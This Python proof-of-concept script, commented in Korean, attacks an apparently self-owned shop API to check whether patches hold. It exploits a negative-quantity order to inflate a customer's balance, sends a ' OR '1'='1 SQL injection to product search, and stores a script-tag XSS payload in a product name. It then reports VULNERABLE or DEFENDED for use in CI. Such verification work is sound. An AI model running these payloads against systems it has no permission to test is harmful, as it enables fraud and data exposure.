#!/usr/bin/env python3
"""
AIR PoC 공격 모듈 (의존성 없음 / stdlib only)

음수수량 자금증식 공격: customer 가 quantity=-N 으로 주문하면 total 이 음수가 되어
잔액 차감 가드(balance >= amount)가 무력화되고 잔액이 '증가'한다.

사용:
  python attack.py --base http://13.125.184.233 --admin-user <id> --admin-pass <pw> negative-qty

동작:
  1) super_admin 로그인 → 공격용 테넌트/상품/고객 준비
  2) 고객 로그인 → 공격 전 잔액 기록
  3) quantity=-100 주문 시도
  4) 공격 후 잔액 비교 → VULNERABLE(증가) / DEFENDED(차단·불변)

패치 후 재실행 시 DEFENDED 가 나오면 자동 방어 성공.
종료코드: 공격 성공(취약)=1, 방어됨=0  (CI/검증에서 활용)
"""
import argparse, json, random, sys, time, urllib.parse, urllib.request, urllib.error

def call(base, method, path, token=None, body=None):
    url = base.rstrip('/') + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header('Content-Type', 'application/json')
    if token:
        req.add_header('Authorization', 'Bearer ' + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        return e.code, (json.loads(raw) if raw else None)

def login(base, username, password):
    st, j = call(base, 'POST', '/api/v1/auth/login',
                 body={'username': username, 'password': password})
    if st != 200 or not j or not j.get('data'):
        raise SystemExit(f"[!] 로그인 실패({username}): {st} {j}")
    return j['data']['accessToken'], j['data']

def prepare(base, admin_tok):
    """super_admin 으로 테넌트/상품/고객 준비. 반환: (tenantId, productId, custUser, custPass)"""
    suffix = f"{int(time.time())}{random.randint(100, 999)}"   # 연속 실행 slug 충돌 방지
    # 테넌트
    st, j = call(base, 'POST', '/api/v1/tenants', admin_tok,
                 {'name': f'atk-{suffix}', 'slug': f'atk-{suffix}'})
    tid = j['data']['id']
    # 상품(가격 5000)
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/products', admin_tok,
                 {'name': 'target', 'price': 5000, 'stock': 100})
    pid = j['data']['id']
    # 고객
    cu, cp = f'atk-cust-{suffix}', 'attacker123!'
    st, j = call(base, 'POST', '/api/v1/users', admin_tok,
                 {'username': cu, 'password': cp, 'role': 'customer',
                  'displayName': 'attacker', 'tenantId': tid})
    if st not in (200, 201):
        raise SystemExit(f"[!] 고객 생성 실패: {st} {j}")
    print(f"[*] 준비 완료: tenant={tid} product={pid} customer={cu}")
    return tid, pid, cu, cp

def balance(base, tok):
    st, j = call(base, 'GET', '/api/v1/users/me', tok)
    return (j or {}).get('data', {}).get('balance', None)

def attack_negative_qty(base, admin_user, admin_pass):
    print("=== AIR PoC: 음수수량 자금증식 공격 ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, pid, cu, cp = prepare(base, admin_tok)

    cust_tok, _ = login(base, cu, cp)
    before = balance(base, cust_tok)
    print(f"[*] 공격 전 잔액: {before}")

    print("[>] 주문 시도: quantity = -100 (상품 5000원)")
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/orders', cust_tok,
                 {'items': [{'productId': pid, 'quantity': -100}]})
    print(f"[<] 응답: HTTP {st} {json.dumps(j, ensure_ascii=False)[:160]}")

    after = balance(base, cust_tok)
    print(f"[*] 공격 후 잔액: {after}")

    if after is not None and before is not None and after > before:
        print(f"\n[RESULT] 🔴 VULNERABLE — 공격 성공! 잔액 {before} → {after} (+{after-before})")
        return 1
    else:
        print(f"\n[RESULT] 🟢 DEFENDED — 공격 차단됨 (주문 거부 또는 잔액 불변)")
        return 0

def attack_sqli(base, admin_user, admin_pass):
    print("=== AIR PoC: SQL Injection (상품 검색 필터 우회) ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, pid, cu, cp = prepare(base, admin_tok)

    # 검색 헬퍼: GET /products/search?q=...  (q 는 URL 인코딩)
    def search(q):
        path = f"/api/v1/tenants/{tid}/products/search?q=" + urllib.parse.quote(q, safe='')
        st, j = call(base, 'GET', path, admin_tok)
        rows = (j or {}).get('data') or []
        return st, rows

    # 1) 절대 매칭 안 되는 무의미 검색 → 0건이 정상(기준선)
    benign = f"zzz_nomatch_{int(time.time())}"
    st_b, rows_b = search(benign)
    print(f"[*] 기준선 검색 q='{benign}' → HTTP {st_b}, {len(rows_b)}건 (정상=0)")

    # 2) 인젝션: ' OR '1'='1  → 취약 시 name LIKE '%' 로 전개되어 전체 반환
    inj = "' OR '1'='1"
    st_i, rows_i = search(inj)
    print(f"[>] 인젝션 검색 q=\"{inj}\" → HTTP {st_i}, {len(rows_i)}건")

    if st_i == 200 and len(rows_i) > 0:
        print(f"\n[RESULT] 🔴 VULNERABLE — 인젝션으로 필터 우회({len(rows_i)}건 노출). ${{}} 동적쿼리 취약.")
        return 1
    else:
        print(f"\n[RESULT] 🟢 DEFENDED — 인젝션 무력화(0건/차단). 안전 바인딩 또는 탐지→방어 활성.")
        return 0

def attack_xss(base, admin_user, admin_pass):
    print("=== AIR PoC: Stored XSS (상품명 스크립트 저장) ===")
    admin_tok, _ = login(base, admin_user, admin_pass)
    tid, _, _, _ = prepare(base, admin_tok)

    payload = "<script>alert('air-xss')</script>"
    print(f"[>] 상품 생성 name={payload}")
    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/products', admin_tok,
                 {'name': payload, 'price': 1000, 'stock': 1})
    print(f"[<] 생성 응답: HTTP {st}")

    pid = (j or {}).get('data', {}).get('id') if j else None
    if not pid:
        print(f"\n[RESULT] 🟢 DEFENDED — 생성이 차단됨(저장 안 됨).")
        return 0

    # 저장된 상품을 다시 조회해 name 에 원본 스크립트가 그대로 남아있는지 확인
    st, j = call(base, 'GET', f'/api/v1/tenants/{tid}/products/{pid}', admin_tok)
    stored = (j or {}).get('data', {}).get('name', '')
    print(f"[*] 저장된 name: {stored}")

    if '<script' in stored.lower():
        print(f"\n[RESULT] 🔴 VULNERABLE — 스크립트가 원문 그대로 저장됨(저장형 XSS).")
        return 1
    else:
        print(f"\n[RESULT] 🟢 DEFENDED — 입력이 이스케이프/제거됨(스크립트 무력화).")
        return 0

def main():
    ap = argparse.ArgumentParser(description="AIR PoC 공격 모듈")
    ap.add_argument('--base', required=True, help='타깃 베이스 URL (예: http://13.125.184.233)')
    ap.add_argument('--admin-user', required=True)
    ap.add_argument('--admin-pass', required=True)
    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss'])
    a = ap.parse_args()
    if a.scenario == 'negative-qty':
        sys.exit(attack_negative_qty(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'sqli':
        sys.exit(attack_sqli(a.base, a.admin_user, a.admin_pass))
    elif a.scenario == 'xss':
        sys.exit(attack_xss(a.base, a.admin_user, a.admin_pass))

if __name__ == '__main__':
    main()
